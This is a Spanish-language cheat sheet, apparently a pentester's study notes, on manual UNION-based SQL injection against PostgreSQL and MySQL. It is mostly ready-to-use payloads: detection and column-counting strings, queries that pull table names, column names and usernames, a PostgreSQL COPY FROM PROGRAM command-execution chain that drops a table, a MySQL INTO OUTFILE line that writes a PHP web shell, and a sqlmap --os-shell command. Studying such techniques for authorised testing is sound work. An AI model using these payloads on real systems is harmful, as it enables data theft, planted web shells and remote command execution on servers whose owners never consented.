---
tags:
  - Chuletas
---
# SQLi — UNION y manual

## Detección
- Romper la consulta: `'`
- `' OR 1=1 -- -` (no rompe, cierra la consulta)
- En Burp, `Ctrl+U` para URL-encode del payload

## Número de columnas
- `' ORDER BY 1 -- -` (ir subiendo hasta que rompa)
- `' UNION SELECT NULL,NULL,... -- -` (tantos NULL como columnas)

## Columnas visibles y tipo de dato
- Cambiar cada `NULL` para ver cuáles se reflejan y qué tipo admiten
- Reconocer motor/privilegios: sustituir `NULL` por `version()`, `current_user`, `current_database()`

## Chuleta de motores
| | PostgreSQL | MySQL / MariaDB |
|---|---|---|
| Versión | `version()` | `@@version` |
| BBDD | `pg_database` | `database()` |
| Esquemas/tablas/columnas | `information_schema.{schemata,tables,columns}` | igual |

## Extracción (ejemplo 5 columnas)
- Tablas: `' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='<db>' -- -`
- Columnas: `' UNION SELECT NULL,column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' -- -`
- Datos: `' UNION SELECT NULL,username,NULL,NULL,NULL FROM users -- -`
- Oracle: añadir `FROM DUAL`

## RCE
- **PostgreSQL** (COPY FROM PROGRAM):
  ```
  '; DROP TABLE IF EXISTS x; CREATE TABLE x(co text); COPY x FROM PROGRAM 'id'; -- -
  ' UNION SELECT NULL,co,NULL,NULL,NULL FROM x -- -
  ```
- **MySQL** (INTO OUTFILE, requiere permisos y ruta escribible):
  ```
  ' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- -
  ```
- Automatizado: `sqlmap -u "http://...?x=1" --cookie="PHPSESSID=..." --os-shell`
